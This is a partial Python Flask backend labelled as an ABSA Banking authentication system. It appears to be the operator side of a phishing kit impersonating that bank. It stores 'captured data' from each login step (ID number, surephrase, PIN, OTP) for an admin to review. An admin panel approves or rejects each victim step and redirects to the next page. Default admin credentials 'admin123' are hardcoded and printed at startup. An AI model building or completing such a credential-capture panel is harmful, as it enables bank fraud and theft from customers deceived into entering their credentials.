from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
from flask_sqlalchemy import SQLAlchemy
import os
import secrets
import time
from datetime import datetime, timedelta
import uuid
import json

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(16))

# Database configuration
database_url = os.environ.get('DATABASE_URL')
if database_url and database_url.startswith('postgres://'):
    database_url = database_url.replace('postgres://', 'postgresql://', 1)

app.config['SQLALCHEMY_DATABASE_URI'] = database_url or 'sqlite:///absa_banking.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Admin credentials (use environment variables in production)
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

# Database Models
class UserSession(db.Model):
    __tablename__ = 'user_sessions'
    
    id = db.Column(db.String(36), primary_key=True)
    session_start = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    status = db.Column(db.String(20), default='active')  # active, completed, abandoned
    approved_at = db.Column(db.DateTime)
    approved_by = db.Column(db.String(50))
    rejected_at = db.Column(db.DateTime)
    rejected_by = db.Column(db.String(50))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relationship to steps
    steps = db.relationship('AuthStep', backref='session', lazy=True, cascade='all, delete-orphan')

class AuthStep(db.Model):
    __tablename__ = 'auth_steps'
    
    id = db.Column(db.Integer, primary_key=True)
    session_id = db.Column(db.String(36), db.ForeignKey('user_sessions.id'), nullable=False)
    step_name = db.Column(db.String(100), nullable=False)
    step_data = db.Column(db.Text)  # JSON string of captured data
    ip_address = db.Column(db.String(45))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    
class ApprovalRequest(db.Model):
    __tablename__ = 'approval_requests'
    
    id = db.Column(db.String(36), primary_key=True)
    session_id = db.Column(db.String(36), db.ForeignKey('user_sessions.id'), nullable=False)
    step_name = db.Column(db.String(100), nullable=False)
    next_url = db.Column(db.String(200))
    user_data = db.Column(db.Text)  # JSON string
    ip_address = db.Column(db.String(45))
    status = db.Column(db.String(20), default='pending')  # pending, approved, rejected
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    handled_at = db.Column(db.DateTime)
    handled_by = db.Column(db.String(50))

# Initialize database
with app.app_context():
    db.create_all()

# In-memory storage for demo purposes (keeping for backward compatibility)
users_db = {
    '1234567890': {
        'id_number': '8001015009088',
        'dob': {'day': '01', 'month': '01', 'year': '1980'},
        'surephrase': 'MYSECUREPHRASE',
        'pin': '12345',
        'phone': '+27 *** *** 7890',
        'email': 'john.doe****@gmail.com',
        'name': 'John Doe',
        'accounts': {
            'cheque': {'number': '****1234', 'balance': 15247.85},
            'savings': {'number': '****5678', 'balance': 45892.15},
            'credit': {'number': '****9012', 'balance': 28500.00}
        }
    }
}

# Session management
login_attempts = {}
otp_codes = {}

# Database helper functions
def create_approval_request_db(session_id, step_name, next_url, user_data=None):
    """Create a new approval request with user data in database"""
    request_id = str(uuid.uuid4())
    
    # Create or get user session
    user_session = UserSession.query.get(session_id)
    if not user_session:
        user_session = UserSession(
            id=session_id,
            ip_address=request.remote_addr if request else 'Unknown'
        )
        db.session.add(user_session)
        db.session.flush()
    
    # Create approval request
    approval_request = ApprovalRequest(
        id=request_id,
        session_id=session_id,
        step_name=step_name,
        next_url=next_url,
        user_data=json.dumps(user_data) if user_data else '{}',
        ip_address=request.remote_addr if request else 'Unknown'
    )
    
    db.session.add(approval_request)
    db.session.commit()
    
    return request_id

def store_user_data_db(session_id, step_name, data):
    """Store user data for admin review in database"""
    # Create or get user session
    user_session = UserSession.query.get(session_id)
    if not user_session:
        user_session = UserSession(
            id=session_id,
            ip_address=request.remote_addr if request else 'Unknown'
        )
        db.session.add(user_session)
        db.session.flush()
    
    # Create auth step record
    auth_step = AuthStep(
        session_id=session_id,
        step_name=step_name,
        step_data=json.dumps(data),
        ip_address=request.remote_addr if request else 'Unknown'
    )
    
    db.session.add(auth_step)
    db.session.commit()

# Legacy compatibility functions (these call the database functions)
def create_approval_request(session_id, step_name, next_url, user_data=None):
    return create_approval_request_db(session_id, step_name, next_url, user_data)

def store_user_data(session_id, step_name, data):
    return store_user_data_db(session_id, step_name, data)

# Rest of the app routes would go here...
# For now, I'll include the basic structure

if __name__ == '__main__':
    # Configuration
    is_production = os.environ.get('FLASK_ENV') == 'production'
    
    if not is_production:
        print("\n" + "="*50)
        print("ABSA Banking Authentication System (WITH DATABASE)")
        print("="*50)
        print("Database: SQLite (local) / PostgreSQL (production)")
        print("Application starting on http://localhost:5000")
        print("Admin Panel: http://localhost:5000/admin")
        print(f"Admin Username: {ADMIN_USERNAME}")
        print(f"Admin Password: {ADMIN_PASSWORD}")
        print("="*50 + "\n")
    
    port = int(os.environ.get('PORT', 5000))
    host = '0.0.0.0' if is_production else '127.0.0.1'
    debug = not is_production
    
    app.run(debug=debug, host=host, port=port)